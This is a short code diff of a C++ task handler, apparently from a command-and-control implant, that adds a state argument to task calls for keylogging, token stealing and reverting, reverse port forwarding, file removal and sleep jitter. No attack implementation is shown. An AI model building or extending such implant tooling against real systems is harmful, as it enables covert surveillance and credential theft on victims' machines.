@@ -236,13 +236,13 @@ namespace Handler
                 wTaskResult = Task::History(pState);
                 break;
             case TASK_IP:
-                wTaskResult = Task::Ip();
+                wTaskResult = Task::Ip(pState);
                 break;
             case TASK_JITTER:
                 wTaskResult = Task::JitterSet(pState, Utils::Convert::UTF8Decode(args["time"]));
                 break;
             case TASK_KEYLOG:
-                wTaskResult = Task::KeyLog(Utils::Convert::UTF8Decode(args["time"]));
+                wTaskResult = Task::KeyLog(pState, Utils::Convert::UTF8Decode(args["time"]));
                 break;
             case TASK_KILL:
                 wTaskResult = Task::Kill(pState);
@@ -267,7 +267,7 @@ namespace Handler
                 );
                 break;
             case TASK_NET:
-                wTaskResult = Task::Net();
+                wTaskResult = Task::Net(pState);
                 break;
             case TASK_PE:
                 wTaskResult = Task::Pe(
@@ -308,7 +308,7 @@ namespace Handler
                 wTaskResult = Task::Rm(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_RMDIR:
-                wTaskResult = Task::Rmdir(Utils::Convert::UTF8Decode(args["path"]));
+                wTaskResult = Task::Rmdir(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_RPORTFWD_ADD:
                 wTaskResult = Task::RportfwdAdd(
@@ -353,7 +353,7 @@ namespace Handler
                 wTaskResult = Task::SleepSet(pState, Utils::Convert::UTF8Decode(args["time"]));
                 break;
             case TASK_TOKEN_REVERT:
-                wTaskResult = Task::TokenRevert();
+                wTaskResult = Task::TokenRevert(pState);
                 break;
             case TASK_TOKEN_STEAL:
                 wTaskResult = Task::TokenSteal(
